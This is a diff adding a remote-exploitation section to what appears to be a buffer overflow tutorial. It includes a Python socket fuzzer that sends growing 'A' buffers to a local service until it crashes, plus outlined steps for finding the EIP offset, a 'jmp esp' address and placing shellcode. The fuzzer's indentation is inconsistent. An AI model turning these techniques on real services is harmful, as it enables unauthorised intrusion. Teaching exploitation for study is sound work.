@@ -368,3 +368,44 @@ Once we have launched the attack we will gain a calc.exe (that we can substitute
 # Remote exploitation
 
 A buffer overflow attack is much more powerfull if its attack vector is the network.
+<br>
+
+In fact if we can connect to an opensource application we can also debug the code locally and test for particular input as we did in the [FUZZING](#Reconnaissance) part.
+<br> 
+
+First we need to identify what port or webserver the service is running on (this is an example of a simple socket on port 8888)
+and we will try to craft our payload:
+```python
+import socket
+from struct import pack
+
+IP = "127.0.0.1"	#insert ur ip
+port = 8888		#ur port
+
+def fuzz():	#define fuzz function
+	try:
+	    for i in range(0,10000,500):	#send data until the programm crashes
+	        buffer = b"A"*i
+	        print(f"Fuzzing {i} bytes")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((IP, port))
+			s.send(buffer)
+			breakpoint()	#set a preakpoint so we can check when the $EIP got overwritten
+			s.close()
+	except:
+		print("[*]Connection failure")
+
+fuzz() #call fuzz function
+```
+Once we have found the right payload size like this (in this case we need to send 1500 bytes):
+	
+![remote debugging](./pic/remote-debugging.png)
+	
+Now we can craft our payload in the same way that we did above.
+<br>
+
+So create unique pattern, check where the $eip offset is then search `jmp esp` and wrote shell code on top of the stack.
+
+
+
+
